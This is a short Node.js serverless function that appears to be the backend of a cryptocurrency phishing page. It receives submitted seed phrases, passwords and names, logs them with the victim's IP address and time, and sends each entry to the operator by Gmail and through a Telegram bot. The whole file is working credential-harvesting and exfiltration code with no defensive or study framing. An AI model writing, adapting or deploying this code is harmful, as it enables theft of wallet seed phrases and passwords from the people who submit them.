const fetch = require('node-fetch');
const nodemailer = require('nodemailer');

module.exports = async (req, res) => {
    // Get environment variables
    const yourEmail = process.env.YOUR_EMAIL;  // Email for sending logs
    const botToken = process.env.BOT_TOKEN;    // Telegram bot token
    const chatId = process.env.CHAT_ID;        // Telegram chat ID

    // Only process POST requests
    if (req.method === 'POST') {
        const { pass, password, name } = req.body;

        const infoDate = new Date().toLocaleString();
        const ipAddress = req.headers['x-forwarded-for'] || req.connection.remoteAddress || "Unknown IP";
        const geoIpLink = `http://www.geoiptool.com/?IP=${ipAddress}`;

        // Collect log message
        let message = '';
        if (pass) {
            message += `[🔐 Seed Phrase]: ${pass}\n`;
        }
        if (password) {
            message += `[🔐 Password]: ${password}\n`;
        }
        if (name) {
            message += `[📛 Name]: ${name}\n`;
        }

        message += `[🌍 IP INFO]: ${geoIpLink}\n[⏰ TIME/DATE]: ${infoDate}\n`;

        // Log to a file (you may need to adjust file paths in Vercel environment)
        const fs = require('fs');
        const logFile = './logs.txt';
        fs.appendFileSync(logFile, message, 'utf8');

        // Send the message to email
        const transporter = nodemailer.createTransport({
            service: 'gmail',
            auth: {
                user: yourEmail,
                pass: process.env.EMAIL_PASSWORD, // Ensure you have the email password in the environment
            }
        });

        const mailOptions = {
            from: yourEmail,
            to: yourEmail,
            subject: 'Log Entry',
            text: message,
        };

        try {
            // Send email
            await transporter.sendMail(mailOptions);

            // Send Telegram notification
            await sendToTelegram(botToken, chatId, message);

            // Send success response
            res.status(200).json({ success: true, message: 'Data submitted successfully!' });

        } catch (error) {
            // Handle errors and send response
            console.error('Error sending email or Telegram:', error);
            res.status(500).json({ success: false, message: 'Error submitting data.' });
        }

    } else {
        // Respond with a method not allowed if not POST
        res.status(405).json({ success: false, message: 'Only POST method is allowed.' });
    }
};

// Function to send data to Telegram
async function sendToTelegram(botToken, chatId, message) {
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const params = {
        chat_id: chatId,
        text: message,
    };

    try {
        const response = await fetch(url, {
            method: 'POST',
            body: new URLSearchParams(params),
        });
        if (!response.ok) {
            throw new Error(`Telegram API error: ${response.statusText}`);
        }
    } catch (error) {
        console.error('Error sending message to Telegram:', error);
    }
}
